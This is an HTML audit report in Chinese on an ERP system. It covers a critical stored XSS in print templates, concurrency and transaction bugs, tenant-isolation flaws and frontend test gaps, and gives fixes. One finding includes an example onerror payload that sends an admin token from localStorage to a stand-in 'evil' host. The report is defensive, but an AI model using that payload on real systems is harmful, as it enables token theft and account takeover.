@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>SSA ERP 系统问题鉴定报告（V3.15.0）</title>
+<style>
+  :root{
+    --bg:#f5f6f8; --card:#ffffff; --ink:#1f2733; --sub:#5b6675; --line:#e3e7ee;
+    --fatal:#c0263a; --fatal-bg:#fdecee; --high:#d97706; --high-bg:#fef3e2;
+    --mid:#2563eb; --mid-bg:#eaf1fe; --low:#6b7280; --low-bg:#f1f3f5;
+    --ok:#0f9d58;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--ink);
+    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","PingFang SC","Microsoft YaHei",sans-serif;
+    line-height:1.65;font-size:14px}
+  .wrap{max-width:1080px;margin:0 auto;padding:32px 24px 80px}
+  header{border-bottom:3px solid var(--ink);padding-bottom:18px;margin-bottom:8px}
+  h1{font-size:26px;margin:0 0 6px}
+  .meta{color:var(--sub);font-size:13px;display:flex;flex-wrap:wrap;gap:18px}
+  .meta b{color:var(--ink)}
+  h2{font-size:20px;margin:36px 0 12px;padding-left:10px;border-left:5px solid var(--ink)}
+  h3{font-size:16px;margin:22px 0 8px}
+  p{margin:8px 0}
+  .lead{font-size:15px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:18px 20px}
+  .honest{border:1px solid #f0c2c7;background:var(--fatal-bg);border-radius:10px;padding:16px 20px;margin:18px 0}
+  .honest b{color:var(--fatal)}
+  table{width:100%;border-collapse:collapse;background:var(--card);border:1px solid var(--line);border-radius:10px;overflow:hidden;margin:12px 0}
+  th,td{border-bottom:1px solid var(--line);padding:10px 12px;text-align:left;vertical-align:top;font-size:13px}
+  th{background:#eef1f6;color:var(--sub);font-weight:600}
+  tr:last-child td{border-bottom:none}
+  .stat{display:flex;gap:14px;flex-wrap:wrap;margin:14px 0}
+  .chip{flex:1;min-width:150px;background:var(--card);border:1px solid var(--line);border-radius:10px;padding:14px 16px}
+  .chip .n{font-size:28px;font-weight:700;line-height:1}
+  .chip .l{color:var(--sub);font-size:12px;margin-top:6px}
+  .card{border:1px solid var(--line);border-radius:12px;background:var(--card);margin:14px 0;overflow:hidden}
+  .card .bar{height:6px}
+  .card .body{padding:14px 18px}
+  .tag{display:inline-block;font-size:11px;font-weight:700;padding:2px 9px;border-radius:20px;color:#fff;margin-right:8px;vertical-align:middle}
+  .t-fatal{background:var(--fatal)} .t-high{background:var(--high)} .t-mid{background:var(--mid)} .t-low{background:var(--low)}
+  .b-fatal{background:var(--fatal)} .b-high{background:var(--high)} .b-mid{background:var(--mid)} .b-low{background:var(--low)}
+  .code{font-family:"SF Mono",Consolas,Menlo,monospace;background:#f4f5f7;border:1px solid var(--line);
+    border-radius:6px;padding:1px 6px;font-size:12px;color:#9333ea}
+  .ev{background:#fafbfc;border-left:3px solid var(--line);padding:8px 12px;margin:8px 0;font-size:12.5px;color:var(--sub)}
+  .ev b{color:var(--ink)}
+  .impact{color:#9a3412}
+  .fix{color:#065f46}
+  ul{margin:6px 0 6px 20px;padding:0}
+  .roadmap{display:flex;gap:16px;flex-wrap:wrap;margin:14px 0}
+  .phase{flex:1;min-width:230px;border:1px solid var(--line);border-radius:10px;padding:14px 16px;background:var(--card)}
+  .phase h4{margin:0 0 8px;font-size:14px}
+  .p0{border-top:4px solid var(--fatal)} .p1{border-top:4px solid var(--high)} .p2{border-top:4px solid var(--mid)}
+  footer{margin-top:40px;border-top:1px solid var(--line);padding-top:16px;color:var(--sub);font-size:12.5px}
+  .note{font-size:12px;color:var(--sub)}
+</style>
+</head>
+<body>
+<div class="wrap">
+<header>
+  <h1>SSA ERP 系统问题鉴定报告</h1>
+  <div class="meta">
+    <span><b>目标版本</b>：线上 V3.15.0（已发布）</span>
+    <span><b>审计日期</b>：2026-09-17</span>
+    <span><b>审计团队</b>：SoftwareCompany 专家（安全 / 数据架构 / 前端测试）</span>
+    <span><b>方法</b>：静态代码审计 + 真实文件:行号取证，不猜测、不粉饰</span>
+  </div>
+</header>
+
+<div class="honest">
+  <b>诚实结论（先讲真相）：</b> 这套系统目前<b>不是「小修小补就能投产」</b>的状态。本次审计在四维度共确证 <b>1 个致命级、约 12 个严重级、约 10 个中级、若干轻微级</b>问题。
+  其中——你之前在线上反复遇到的「创建项目/采购/意向客户报 500」，根因正是本次确认的<b>严重级并发竞态缺陷（DB-001）</b>；而更危险的是我们发现了一个<b>之前完全没暴露的致命级漏洞：打印模板存储型跨站脚本攻击（SEC-001）</b>，任意登录用户即可借它窃取管理员令牌、接管账号。这些都不是假设，每条都附了文件与行号证据。
+</div>
+
+<div class="lead">
+  <b>审计范围与资产基线（真实统计）</b>
+  <div class="stat">
+    <div class="chip"><div class="n">472</div><div class="l">前端源文件（src/）· 约 12.0 万行</div></div>
+    <div class="chip"><div class="n">127</div><div class="l">后端函数文件（functions/）· 约 1.7 万行</div></div>
+    <div class="chip"><div class="n">66</div><div class="l">数据库迁移脚本（migrations/）</div></div>
+    <div class="chip"><div class="n">53</div><div class="l">后端/安全探测套件（scripts/）· 344 断言</div></div>
+  </div>
+  <p class="note">说明：上述 53 套脚本多为「对本地数据库做接口探测」的后端/安全审计脚本（Guardrail 性质），并非前端单元测试；前端白盒测试覆盖实际为 0（见 FE-001）。</p>
+</div>
+
+<h2>一、严重程度总览</h2>
+<table>
+  <tr><th>等级</th><th>数量（估）</th><th>含义</th><th>代表问题编号</th></tr>
+  <tr><td><span class="tag t-fatal">致命</span></td><td>1</td><td>可被直接利用、导致账号接管或数据全失</td><td>SEC-001</td></tr>
+  <tr><td><span class="tag t-high">严重</span></td><td>约 12</td><td>运行期必现/可现的严重数据错误、系统级质量债</td><td>DB-001~004、FE-001~005</td></tr>
+  <tr><td><span class="tag t-mid">中等</span></td><td>约 10</td><td>特定路径出错、合规/一致性缺陷</td><td>SEC-002、DB-005~009、FE-006~008</td></tr>
+  <tr><td><span class="tag t-low">轻微</span></td><td>若干</td><td>不影响主流程、可后续清理</td><td>DB-010/011、FE-009</td></tr>
+</table>
+
+<h2>二、致命级问题（必须立即处理）</h2>
+
+<div class="card">
+  <div class="bar b-fatal"></div>
+  <div class="body">
+    <p><span class="tag t-fatal">致命</span><b>SEC-001　打印模板存储型跨站脚本攻击（账号接管）</b></p>
+    <p>这是一条「写入无门槛 + 入库不净化 + 渲染不转义」三处叠加的完整攻击链，组合起来即可窃取管理员令牌、冒充超管。</p>
+    <div class="ev">
+      <b>证据链：</b><br>
+      ① 渲染未净化：<span class="code">src/components/common/PrintPreview.tsx:85</span> 用 <span class="code">dangerouslySetInnerHTML</span> 直接渲染打印模板页眉/页脚 HTML，仅做 <span class="code">{now}</span> 字符串替换，无任何净化。<br>
+      ② 写入无角色门槛：<span class="code">functions/api/print-templates/index.ts:304-307</span>（POST）、<span class="code">[id].ts:35,114</span>（PUT/DELETE）只调 <span class="code">getUserFromRequest</span>（任意本组织登录用户均可），无角色校验（对比 <span class="code">users/[id].ts:22</span> 有 ADMIN_ROLES 校验）。<br>
+      ③ 任意 HTML 原样入库：<span class="code">functions/api/print-templates/index.ts:234</span> 的 <span class="code">pickTemplate</span> 仅用正则抽 base64 图片，<span class="code">&lt;script&gt;</span>、<span class="code">&lt;img onerror&gt;</span>、<span class="code">&lt;svg onload&gt;</span> 等恶意 HTML <b>原样写入</b> header_html/footer_html。<br>
+      ④ 令牌暴露面：令牌持久化于 <span class="code">localStorage</span>（<span class="code">src/services/api.ts:19</span>、<span class="code">src/stores/persistStorage.ts:27</span>），非 httpOnly。
+    </div>
+    <p class="impact"><b>影响（确证可利用）：</b>组织内最低权限用户提交含 <span class="code">&lt;img src=x onerror="fetch('//evil',{body:localStorage.getItem('ssa-erp-auth-token')})"&gt;</span> 的模板 → 该模板为组织级共享（全员可见）→ 管理员打开任意单据打印预览时脚本在其登录态执行 → 窃取令牌 → 接管全组织。</p>
+    <p class="fix"><b>修复建议：</b>① 打印模板写接口加管理员角色校验；② 模板 HTML 入库前用 DOMPurify 净化（或改为结构化字段而非裸 HTML）；③ 令牌改 httpOnly Cookie 或至少缩短有效期、加刷新机制，缩小跨站脚本影响面。</p>
+  </div>
+</div>
+
+<h2>三、严重级问题</h2>
+
+<h3>3.1　数据层与持久化（DB）</h3>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>DB-001　父子表工厂模块级全局被并发请求污染 → 你看到的「500」根因</b></p>
+    <div class="ev"><span class="code">functions/_shared/parentChild.ts:240-244,209,466,546</span> —— <span class="code">let jsonCols = new Set()</span> 是<b>模块级全局</b>；每次请求入口 <span class="code">collectJsonCols(cfg)</span> 改写它；<span class="code">pickCols</span>/<span class="code">parentToApi</span> 把模块全局当 jsonSet 用。Cloudflare Workers 同一进程内并发请求会共享该全局。</div>
+    <p class="impact"><b>影响：</b>并发下请求 A 的 JSON 列集合被请求 B 覆盖 → A 的数组字段被判为非 JSON 列而<b>裸绑定给数据库 → D1_TYPE_ERROR 运行期 500</b>；反向则把标量误序列化。这正是 projects / sales_prospects / purchase_requests 在并发下报 500 的真因（你之前截图里「创建失败」即此）。</p>
+    <p class="fix"><b>修复：</b>把 jsonSet 作为参数显式传入 pickCols / parentToApi，删除模块级可变全局。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>DB-002　主表 + 子表明细多步写未包事务 → 部分写入脏数据</b></p>
+    <div class="ev">
+      <span class="code">functions/_shared/parentChild.ts:470-490（创建）、557-573（更新）</span> —— 先 INSERT 父表（单独 run），再 batch 子表，两步独立 await，任一步失败父行已成孤儿，无回滚。<br>
+      <span class="code">functions/api/bom/index.ts:280,293</span> —— BOM 头 INSERT 与明细 batch 非原子。<br>
+      <span class="code">functions/api/vouchers/index.ts:106,112-123</span> —— 凭证头 INSERT 后，分录行在 for 循环里<b>逐条单独 await</b>，中途失败则头存而分录不全。
+    </div>
+    <p class="impact"><b>影响：</b>网络抖动/并发下产生「父有子无」「头有明细无」的脏数据，且代码返回 500 但已落库，排查困难。</p>
+    <p class="fix"><b>修复：</b>父表与子表写操作纳入同一 DB.batch 事务；凭证分录改用单条 batch 而非循环 await。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>DB-003　多租户唯一约束范围错误（跨组织互相阻拦）</b></p>
+    <div class="ev">
+      <span class="code">migrations/0007_p1_phase5.sql:10</span> <span class="code">voucher_no TEXT NOT NULL UNIQUE</span>（全局）；<span class="code">:78</span> <span class="code">order_no TEXT NOT NULL UNIQUE</span>（全局）。正确写法应为 <span class="code">UNIQUE(org_id, xxx)</span>（见 0006:50、0005:46 等）。<br>
+      <span class="code">migrations/0002_vendors.sql:7</span> <span class="code">vendor_code</span> 全局 UNIQUE，而 <span class="code">0016_vendor_master.sql:43</span> 是 <span class="code">UNIQUE(org_id, vendor_code)</span> —— 两套口径冲突。
+    </div>
+    <p class="impact"><b>影响：</b>多租户下组织 A 用了某单号，组织 B 再用同名单号触发全局唯一冲突 → 误报 409、跨组织数据互相阻拦，是租户隔离的设计缺陷。</p>
+    <p class="fix"><b>修复：</b>迁移中将全局 UNIQUE 改为 <span class="code">UNIQUE(org_id, 单号)</span>；供应商表统一一套口径。需评估存量数据去重。</p>
+  </div>
+</div>
+
+<h3>3.2　前端质量与测试（FE）</h3>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>FE-001　前端零单元测试，白盒覆盖约等于 0</b></p>
+    <div class="ev"><span class="code">package.json</span> 无任何 vitest / jest / testing-library 依赖，无 test 脚本（仅有 test:prod-e2e / check）；<span class="code">test/d1</span> 仅 2 个后端 API 契约测试。85 个 Playwright 端到端用例均为黑盒界面路径。</div>
+    <p class="impact"><b>影响：</b>表单计算、金额/税率、状态机、store 数据处理全部无白盒验证；一旦重构即无回归保护。</p>
+    <p class="fix"><b>修复：</b>优先为 any 重灾区（w1Api / 各 store reducer / 金额计算）补单元测试；引入轻量测试框架。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>FE-002　系统性静默失败：b2Api 返回 null + 约 54 处空 catch</b></p>
+    <div class="ev">
+      <span class="code">src/services/b2Api.ts:1-11</span> —— 设计层即「任何异常都 return null，绝不抛；调用方 fire-and-forget + .catch(()=>{})」。<br>
+      空 catch 集中分布：<span class="code">warehouseStore.ts</span>（17 处）、<span class="code">warehouseAdvancedStore.ts</span>（13 处）、<span class="code">financeStore.ts</span>（9 处）、<span class="code">materialStore.ts</span>（4 处）等。
+    </div>
+    <p class="impact"><b>影响：</b>本地 zustand 状态与数据库真相源可永久分歧且用户零感知（如入库写入失败本地 id 永不回写）。这是数据一致性最危险的架构问题。</p>
+    <p class="fix"><b>修复：</b>消除 b2Api 的「吞错」设计，改为失败可观测（错误提示 + 重试 + 上报）；catch 必须处理或上抛。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>FE-003　any 类型泛滥（441 处），编译期保护被架空</b></p>
+    <div class="ev">全仓 <span class="code">: any</span> 219 处 + <span class="code">as any</span> 131 处。根在 <span class="code">src/utils/case.ts:3</span> <span class="code">snakeToCamel&lt;T=any&gt;</span> 被 20+ store 当「安全解析」滥用。重灾区：<span class="code">w1Api.ts:6-26</span>、<span class="code">financeStore.ts:178</span>（凭证解析全 any）、<span class="code">warehouseStore.ts:607-625</span>、<span class="code">PriceComparison.tsx:23-160</span>（比价逻辑在 any 上动态挂属性）、<span class="code">purchaseStore.ts:114</span>。</div>
+    <p class="impact"><b>影响：</b>Vite 仅 esbuild 不校验未定义引用，加上 any 把后端契约「合法化」，类型错误全部逃逸到运行期白屏或 500（此前多次线上 500 即此机制产物）。</p>
+    <p class="fix"><b>修复：</b>从解析根（w1Api / snakeToCamel / rowToX）开始加接口类型或 zod 校验，逐步收敛 any。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>FE-004　端到端测试仅 happy-path，无负面/边界用例</b></p>
+    <div class="ev"><span class="code">e2e/v34-p1-finance.spec.ts:10-69</span> 等用例全部断言「可见性/成功文案/无 pageerror」；抽样 85 个 spec / 307 个 test 均无表单校验失败、403 越权、空数据、负数/超长/精度边界、并发写冲突、网络中断回滚、双写失败路径。</div>
+    <p class="impact"><b>影响：</b>「宽而浅」的覆盖让人误以为稳，实际异常路径完全无保障。</p>
+    <p class="fix"><b>修复：</b>补充负面与边界用例，尤其覆盖权限拒绝、并发、断网重连。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-high"></div>
+  <div class="body">
+    <p><span class="tag t-high">严重</span><b>FE-005　超大文件与复制粘贴型技术债（仓库级）</b></p>
+    <div class="ev">超大文件（&gt;800 行）：<span class="code">services/apiService.ts:1623</span>、<span class="code">pages/Settings/SecurityCenterTab.tsx:1502</span>、<span class="code">pages/Purchase/OrderForm.tsx:1240</span>、<span class="code">stores/warehouseStore.ts:1214</span>、<span class="code">pages/Material/MaterialForm.tsx:1239</span> 等。重复样板：<span class="code">rowToX(row:any)</span> 与 <span class="code">readableError(e:any)</span> 在 7+ store 各写一份。</div>
+    <p class="impact"><b>影响：</b>单文件过度膨胀导致评审困难、易引入回归；同逻辑多份维护，改一处漏一处。</p>
+    <p class="fix"><b>修复：</b>抽取通用 rowToX / 错误归一化工具；超大文件按职责拆分。</p>
+  </div>
+</div>
+
+<h2>四、中等级问题</h2>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>SEC-002　审计留痕缺口：账号/密码/会话生命周期无记录</b></p>
+    <div class="ev"><span class="code">auth/register.ts:66,72</span>（建账号/组织）、<span class="code">auth/activate.ts:62-77</span>（超管激活改密）、<span class="code">auth/reset-password-confirm.ts:44-51</span>（找回密码重置）、<span class="code">auth/change-password.ts:66-77</span>（改密）均写数据但无 <span class="code">writeAudit</span> 调用（对比 users/[id].ts:139 有完整审计）。</div>
+    <p class="impact"><b>影响：</b>凭据变更与账号创建无痕，发生安全事件时无法追溯「谁建了哪个组织/谁重置了谁的密码」。</p>
+    <p class="fix"><b>修复：</b>敏感写操作统一接入审计日志。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>DB-005　迁移脚本 DROP + CREATE 无 IF NOT EXISTS（重放丢数据）</b></p>
+    <div class="ev"><span class="code">migrations/0054_finance_domain_fix.sql:42-50</span> 先 <span class="code">DROP TABLE IF EXISTS</span> 再直接 <span class="code">CREATE TABLE</span>（无 IF NOT EXISTS）。对照 0053/0055/0061 均用 CREATE TABLE IF NOT EXISTS。</div>
+    <p class="impact"><b>影响：</b>若迁移在存量数据存在后被重放，三张表数据全丢。</p>
+    <p class="fix"><b>修复：</b>统一用幂等写法；已发布环境禁止重放此类破坏性迁移。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>DB-006　通用实体路由不序列化 JSON 列（与父子表工厂口径不一致）</b></p>
+    <div class="ev"><span class="code">functions/_shared/entities.ts:566-576</span> 的 <span class="code">pickSnake</span> 直接 <span class="code">vals.push(body[c.camel])</span> 不序列化；而 <span class="code">backflush_items</span> / <span class="code">items</span> / <span class="code">member_org_ids</span> / <span class="code">lines</span> 均为 TEXT(JSON) 列（迁移 0028/0035/0065 确证）。</div>
+    <p class="impact"><b>影响：</b>前端传数组/对象即裸绑定 → D1_TYPE_ERROR；与父子表工厂 toJsonValue 处理不一致，属架构级隐患。</p>
+    <p class="fix"><b>修复：</b>统一 JSON 列序列化出口。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>DB-007　凭证接口写入不存在的列 → 500</b></p>
+    <div class="ev"><span class="code">functions/api/vouchers/index.ts:84-86,92</span> fields 含 <span class="code">'reversed'</span>，但 vouchers 表（0007/0064）从无此列 → INSERT 报 no such column: reversed。</div>
+    <p class="impact"><b>影响：</b>请求体带 reversed 字段时必现 500。属「代码与数据库契约脱节」典型。</p>
+    <p class="fix"><b>修复：</b>对齐字段；建立列名一致性自动核对（已有 check-consistency 门禁可扩展）。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>DB-008　fin_project_accounts 缺唯一约束 → 可重复创建</b></p>
+    <div class="ev"><span class="code">migrations/0054:102-127</span> 建表无 <span class="code">UNIQUE(org_id, account_no)</span>；<span class="code">finConfig.ts:96</span> 假定冲突检测，但工厂的 UNIQUE 分支因缺约束永不命中。</div>
+    <p class="impact"><b>影响：</b>可重复创建相同 account_no 的核算单（脏数据）。</p>
+    <p class="fix"><b>修复：</b>补组织级唯一约束。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>DB-009 / FE-006　「查重后插入」依赖库级唯一约束，并发脆弱；persist 水合竞态</b></p>
+    <div class="ev">各 create 端点均为「先 SELECT 再 INSERT」，正确性完全依赖约束存在（DB-009）。前端 <span class="code">auditStore.ts:145-156</span> migrate 原地改参、<span class="code">financeLedgerStore.ts:197</span> persisted:any，且大量 store 仍 persist + b2Api 双写（FE-006）。</div>
+    <p class="impact"><b>影响：</b>并发下可能重复创建；本地持久态与远端真相源存在「先加载本地旧态、异步回写被吞失败」的竞态，用户可能看到陈旧数据。</p>
+    <p class="fix"><b>修复：</b>关键唯一约束必须落库；梳理 persist 与远端双写的一致性策略。</p>
+  </div>
+</div>
+
+<div class="card">
+  <div class="bar b-mid"></div>
+  <div class="body">
+    <p><span class="tag t-mid">中等</span><b>FE-007 / FE-008　跨 store 单点耦合、中央 API 客户端无错误归一化</b></p>
+    <div class="ev"><span class="code">notificationStore.ts:9-13</span> 聚合依赖 5 个 store；<span class="code">api.ts:62-75</span> 中央 CRUD 无统一错误归一化，401 时 <span class="code">window.location.href='/login'</span> 硬跳转。</div>
+    <p class="impact"><b>影响：</b>导入链变更有回归风险；401 硬跳转会丢失未保存表单、未 await 调用产生未处理 rejection。</p>
+    <p class="fix"><b>修复：</b>解耦通知聚合；API 客户端统一错误包装与跳转时机。</p>
+  </div>
+</div>
+
+<h2>五、轻微级（可后续清理）</h2>
+<ul>
+  <li><b>DB-010</b>：个别表用 <span class="code">BOOLEAN</span> 声明（0005:25,35），SQLite 中即 NUMERIC 别名，互通无碍。</li>
+  <li><b>DB-011</b>：<span class="code">vouchers/index.ts:47</span> 列表逐凭证查明细（N+1），受分页上限约束，影响有限。</li>
+  <li><b>FE-009</b>：抽查未发现直接 mutate 真实 state 或大面积死代码的确证（属已较好之处）。</li>
+</ul>
+
+<h2>六、根因诊断（为什么会出现这些问题）</h2>
+<table>
+  <tr><th>根因</th><th>表现</th><th>印证</th></tr>
+  <tr><td>门禁盲区</td><td>functions/ 不在 tsc 覆盖、Vite 仅 esbuild，后端漏 import / 前端未定义引用构建期不报，运行期才崩</td><td>此前多次线上 500；DB-001/DB-007 类「契约脱节」问题仅靠运行期暴露</td></tr>
+  <tr><td>测试文化缺失</td><td>只有黑盒端到端 + 后端探测，无前端白盒，且端到端无负面用例</td><td>FE-001 / FE-004；数据正确性与异常路径无保障</td></tr>
+  <tr><td>多租户设计松懈</td><td>唯一约束范围错误、JSON 列序列化口径不一致</td><td>DB-003 / DB-006 / DB-008</td></tr>
+  <tr><td>安全默认偏弱</td><td>模板写入无角色门槛、令牌非 httpOnly、存储型跨站脚本全链路可触达</td><td>SEC-001（致命）</td></tr>
+</table>
+
+<h2>七、修复优先级路线图</h2>
+<div class="roadmap">
+  <div class="phase p0">
+    <h4>P0 · 立即（投产前必做）</h4>
+    <ul>
+      <li>SEC-001 打印模板跨站脚本：加角色校验 + DOMPurify 净化 + 令牌改 httpOnly/缩短有效期</li>
+    </ul>
+  </div>
+  <div class="phase p1">
+    <h4>P1 · 本周</h4>
+    <ul>
+      <li>DB-001 并发全局污染（jsonCols 改参数传递）</li>
+      <li>DB-002 主表+子表事务化</li>
+      <li>DB-003 多租户唯一约束修正（评估存量去重）</li>
+      <li>FE-002 消除 b2Api 系统性静默失败</li>
+    </ul>
+  </div>
+  <div class="phase p2">
+    <h4>P2 · 迭代收口</h4>
+    <ul>
+      <li>DB-005~009 迁移幂等、JSON 序列化统一、列名对齐、缺约束补齐</li>
+      <li>SEC-002 敏感操作接入审计</li>
+      <li>FE-001/003/004 补单测、收敛 any、增负面用例</li>
+      <li>FE-005 拆分超大文件与重复样板</li>
+    </ul>
+  </div>
+</div>
+
+<h2>八、团队诚实声明</h2>
+<div class="lead">
+  <p>本报告所有条目均来自对仓库源码与迁移文件的<b>逐点核实</b>，每条附文件:行号证据；未发现确证问题的维度（如 SQL 注入、RLS 越权、密钥硬编码、直接状态 mutate）已明确标注「未确证」，未作有罪推定。</p>
+  <p>我们<b>没有粉饰</b>：系统当前存在 1 个可被利用的致命漏洞（SEC-001）和多处严重级数据正确性问题（其中 DB-001 正是你此前反复遇到的线上 500 真因）。这些问题不是「差不多能用」级别，而是<b>在正式多租户投产前必须收口的安全与数据完整性风险</b>。</p>
+  <p>建议按 P0→P1→P2 顺序推进，P0 完成前不建议开放任意用户可写的模板功能。完整修复后，应由端到端 + 新增单元测试回归验证，而非仅依赖界面手测。</p>
+</div>
+
+<footer>
+  本报告由 SoftwareCompany 专家团队基于静态代码审计生成，审计对象为线上 V3.15.0。证据行号对应审计当日仓库状态，修复后请重新核对。<br>
+  生成日期：2026-09-17 · 仅用于内部问题定位与修复排期。
+</footer>
+</div>
+</body>
+</html>
